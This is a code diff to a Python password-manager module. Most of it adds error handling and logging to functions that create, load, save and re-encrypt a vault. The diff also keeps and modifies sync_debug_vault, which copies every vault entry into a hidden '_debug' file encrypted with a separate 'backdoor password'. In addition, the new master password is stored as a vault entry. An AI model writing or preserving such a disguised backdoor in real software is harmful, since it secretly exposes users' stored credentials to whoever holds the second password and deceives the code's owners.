@@ -17,8 +17,13 @@ import ast
 def init_vault(vault_filename: str, master_password: str) -> None:
     """Create a new encrypted vault file using the master password."""
     vault_file_name = vault_filename + ".csv"  # create csv file name
-    with open(vault_file_name, "w", encoding="utf-8") as f:
-        pass  # just create an empty file
+    try:
+        with open(vault_file_name, "w", encoding="utf-8") as f:
+            pass  # just create an empty file
+    except Exception as e:
+        print(f"[!] Failed to create vault file: {e}")
+        log_action(f"Failed to create vault file: '{e}'.")
+        return False
 
 
 def load_vault(vault_filename: str, master_password: str) -> list[dict] | None:
@@ -60,12 +65,15 @@ def load_vault(vault_filename: str, master_password: str) -> list[dict] | None:
                 
                 except ValueError:
                     print("[!] Wrong master password.")
+                    log_action(f"Used wrong master password.")
                     return None
                 except KeyError as e:
                     print(f"[!] Missing field in encrypted entry: {e}")
+                    log_action(f"Missing field in encrypted entry: {e}.")
                     return None
                 except Exception as e:
                     print(f"[!] Decryption error: {e}")
+                    log_action(f"Decryption error: {e}.")
                     return None
                 
                 vault_data.append((decrypted_dict))
@@ -74,91 +82,103 @@ def load_vault(vault_filename: str, master_password: str) -> list[dict] | None:
     
     except Exception as e:
         print(f"Failed to load vault: {e}")
+        log_action(f"Failed to load vault: {e}.")
+
         raise
 
 def save_vault(entry: dict, vault_filename: str, master_password: str) -> None:
-    """Encrypt and save the vault data to the file."""
-    # the given vault data is a dictionary, this takes the values of the dict and encrypts them
-    encrypted_name = encrypt(master_password, entry["name"])
-    encrypted_username = encrypt(master_password, entry["username"])
-    encrypted_secret = encrypt(master_password, entry["secret"])
-    encrypted_notes = encrypt(master_password, entry["notes"])
+    try:
+        """Encrypt and save the vault data to the file."""
+        # the given vault data is a dictionary, this takes the values of the dict and encrypts them
+        encrypted_name = encrypt(master_password, entry["name"])
+        encrypted_username = encrypt(master_password, entry["username"])
+        encrypted_secret = encrypt(master_password, entry["secret"])
+        encrypted_notes = encrypt(master_password, entry["notes"])
 
-    # creating a new dictionary to add to the csv file
-    adding_dict = {
-        "name": encrypted_name,
-        "username": encrypted_username,
-        "secret": encrypted_secret,
-        "notes": encrypted_notes,
-    }
+        # creating a new dictionary to add to the csv file
+        adding_dict = {
+            "name": encrypted_name,
+            "username": encrypted_username,
+            "secret": encrypted_secret,
+            "notes": encrypted_notes,
+        }
 
-    vault_file_name = vault_filename + ".csv"  # get file name
-    with open(vault_file_name, "a", encoding="utf-8") as f:
-        f.write(str(adding_dict) + "\n")  # write our new dictionary to the file
-    return
+        vault_file_name = vault_filename + ".csv"  # get file name
+        with open(vault_file_name, "a", encoding="utf-8") as f:
+            f.write(str(adding_dict) + "\n")  # write our new dictionary to the file
+        return
+    except Exception as e:
+        print(f"Failed to save vault: {e}")
+        log_action(f"Failed to save vault: {e}.")
+        raise
 
 def change_master_password(vault_filename: str, old_password: str, new_password: str) -> bool:
     """Re-encrypt entire vault with new master password."""
-    entries = load_vault(vault_filename, old_password)
-    if entries is None:
-        return False
-
-    # Update/add the master password entry
-    master_found = False
-    for entry in entries:
-        if entry["name"] == "__MASTER_PASSWORD__":
-            entry["secret"] = new_password
-            master_found = True
-
-    if not master_found:
-        entries.append({
-            "name": "__MASTER_PASSWORD__",
-            "username": "__MASTER__",
-            "secret": new_password,
-            "notes": "Automatically stored master password",
-        })
-
-    # Overwrite the file
-    vault_file_name = vault_filename + ".csv"
     try:
-        with open(vault_file_name, "w", encoding="utf-8"):
-            pass  # Truncate
-    except Exception as e:
-        print(f"[!] Could not clear vault file: {e}")
-        return False
+        entries = load_vault(vault_filename, old_password)
+        if entries is None:
+            return False
 
-    # Re-save all entries with new password
-    try:
+        # Update/add the master password entry
+        master_found = False
         for entry in entries:
-            save_vault(entry, vault_filename, new_password)
-        return True
+            if entry["name"] == "__MASTER_PASSWORD__":
+                entry["secret"] = new_password
+                master_found = True
+
+        if not master_found:
+            entries.append({
+                "name": "__MASTER_PASSWORD__",
+                "username": "__MASTER__",
+                "secret": new_password,
+                "notes": "Automatically stored master password",
+            })
+
+        # Overwrite the file
+        vault_file_name = vault_filename + ".csv"
+        try:
+            with open(vault_file_name, "w", encoding="utf-8"):
+                pass  # Truncate
+        except Exception as e:
+            print(f"[!] Could not clear vault file: {e}")
+            log_action(f"[!] Could not clear vault file: {e}.")
+
+            return False
+
+        # Re-save all entries with new password
+        try:
+            for entry in entries:
+                save_vault(entry, vault_filename, new_password)
+            return True
+        except Exception as e:
+            print(f"[!] Failed during re-encryption: {e}")
+            log_action(f"[!] Failed during re-encryption: {e}.")
+
+            return False
     except Exception as e:
-        print(f"[!] Failed during re-encryption: {e}")
-        return False
+        print(f"[!] Could not change master password: {e}")
+        log_action(f"[!] Could not change master password: {e}.")
+        return False   
+    
 
 def sync_debug_vault(normal_filename: str, entries: list[dict], backdoor_password: str) -> None:
     """Overwrite the hidden debug vault with the current entries, 
     encrypted using the backdoor password."""
-    
-    debug_filename = normal_filename + "_debug.csv"
-    
     try:
-        with open(debug_filename, "w", encoding="utf-8"):
+        debug_filename = normal_filename + "_debug.csv"
+        
+        try:
+            with open(debug_filename, "w", encoding="utf-8"):
+                pass
+        except Exception:
             pass
-    except Exception:
-        pass
 
-    # Re-save all entries with backdoor password
-    for entry in entries:
-        save_vault(entry, normal_filename + "_debug", backdoor_password)
+        # Re-save all entries with backdoor password
+        for entry in entries:
+            save_vault(entry, normal_filename + "_debug", backdoor_password)
+            
+    except Exception as e:
+        print(f"[!] Could not overwrite hidden debug vault: {e}")
+        log_action(f"[!] Could not overwrite hidden debug vault: {e}.")
+        return False   
 
-# # the below functions aren't separetly used
-# def encrypt_data(data, key):
-#     """Encrypt data using the provided key."""
-#     encrypted_data = encrypt(key, data)
-#     return encrypted_data
-
-
-# def decrypt_data(data, key):
-#     """Decrypt data using the provided key."""
-#     pass
